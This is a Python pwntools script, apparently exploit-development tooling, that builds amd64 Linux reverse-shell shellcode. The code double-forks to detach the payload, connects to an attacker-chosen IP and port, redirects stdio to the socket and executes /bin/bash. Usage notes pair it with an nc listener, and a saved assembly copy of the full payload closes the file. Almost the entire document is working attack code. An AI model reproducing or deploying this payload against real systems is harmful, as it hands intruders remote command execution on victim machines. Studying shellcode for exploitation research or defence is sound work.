# date: 20191216
# author: thinkycx
# description:
#       this script is used to generate shellcode : fork fork and run shellcode and the shellcode's PPID is 0
#       run this script and you will get the program to test the shellcode
# usage:
#       python fork-fork-reverseshell.py 127.0.0.1 7777
#       get the process name, such as: /tmp/pwn-asm-cPEmKu/step3
#       terminal1: 
#           nc -lvvp 7777
#       terminal1:
#           gdb /tmp/pwn-asm-cPEmKu/step3 --ex "set follow-fork-mode parent" --ex "start" --ex "break fork_fork_shellcode_end"  --ex "c"


from pwn import *
import pwnlib
import sys


def fork_fork_shellcode(shellcode='/* shellcode */\n nop; \n'):
    '''
    a shellcode wrapper, which will let the shellcode's parent PID is 0
    fork- (and continue)
         |_ fork (and exit)
               |_ shellcode (which parent's PID is 0)
    
    registers affected: 
        rax, edi
    '''
    # 1 first fork
    sc = pwnlib.shellcraft.amd64.linux.fork()
    sc += 'cmp rax, 1; \n jnl fork_fork_shellcode_end; \n'          # jmp to the end for parent        jnl -> end       (parent)
    # 2 second fork
    sc += pwnlib.shellcraft.amd64.linux.forkexit()                  # jmp to the shellcode for child   jl  -> shellcode (child)
    # 3 shellcode
    sc += shellcode
    # 4 end
    sc += 'fork_fork_shellcode_end:\n nop; nop; nop; \n'            # use gdb to break fork_fork_shellcode_end+1 and to see the output
    # print sc                                                    
    return sc

def reverse_shellcode(ip, port):
    '''
    use pwntools to generate shellcode
    1. http://docs.pwntools.com/en/stable/shellcraft/amd64.html#module-pwnlib.shellcraft.amd64.linux
    2. https://github.com/Gallopsled/pwntools/blob/292b81af179e25e7810e068b3c06a567256afd1d/pwnlib/shellcraft/templates/amd64/linux/sh.asm
    '''
    sc = pwnlib.shellcraft.amd64.linux.connect(ip, port, network='ipv4')
    # sc += pwnlib.shellcraft.amd64.linux.dupsh(sock='rbp')
    # or ..
    sc += pwnlib.shellcraft.amd64.linux.dup(sock='rbp')
    sc += pwnlib.shellcraft.amd64.linux.execve('/bin/bash', ['/bin/bash'], 0)
    
    return sc


def get_shellcode(ip='127.0.0.1', port=7777):
    context.arch='amd64'
    shellcode = reverse_shellcode(ip, port)
    sc = fork_fork_shellcode(shellcode)
    return sc

if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 7777
    context.arch='amd64'

    if len(sys.argv) != 3:
        print '[*] python injectshellcode.py <ip> <port>'
        exit(0)
    else:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    print '[*] IP %s PORT: %s' % (ip, port)

    shellcode = reverse_shellcode(ip, port)
    sc = fork_fork_shellcode(shellcode)
    # run 
    # run_assembly(sc)
    # print sc
    print asm(sc, arch='amd64')
    raw_input('exit?')
    
'''
just save it  
'''

# the shellcode will destroy rax, however it doesn't matter in most cases 
reverse_shell_shellcode = '''
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 0x39 */
    pop rax
    syscall
cmp rax, 1;
 jnl fork_fork_shellcode_end;
    /* fork() */
    /* setregs noop */
    /* call fork() */
    push SYS_fork /* 0x39 */
    pop rax
    syscall
    cmp rax, 1
    jl forkexit_4
    /* exit(status=0) */
    xor edi, edi /* 0 */
    /* call exit() */
    push SYS_exit /* 0x3c */
    pop rax
    syscall
forkexit_4:
    /* open new socket */
    /* open new socket */
    /* call socket(2, Constant('SOCK_STREAM', 0x1), 0) */
    push SYS_socket /* 0x29 */
    pop rax
    push 2
    pop rdi
    push SOCK_STREAM /* 1 */
    pop rsi
    cdq /* rdx=0 */
    syscall

    /* Put socket into rbp */
    mov rbp, rax

    /* Create address structure on stack */
    /* push '\x02\x00\x1ea\x7f\x00\x00\x01' */
    mov rax, 0x201010101010101
    push rax
    mov rax, 0x201010101010101 ^ 0x100007f611e0002
    xor [rsp], rax

    /* Connect the socket */
    /* call connect('rbp', 'rsp', 16) */
    push SYS_connect /* 0x2a */
    pop rax
    mov rdi, rbp
    push 0x10
    pop rdx
    mov rsi, rsp
    syscall
    /* dup() file descriptor rbp into stdin/stdout/stderr */
dup_1:
    /* moving rbp into rbp, but this is a no-op */

    push 3
loop_2:
    pop rsi
    dec rsi
    js after_3
    push rsi

    /* call dup2('rbp', 'rsi') */
    push SYS_dup2 /* 0x21 */
    pop rax
    mov rdi, rbp
    syscall

    jmp loop_2
after_3:

    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
fork_fork_shellcode_end:
 nop; nop; nop;
'''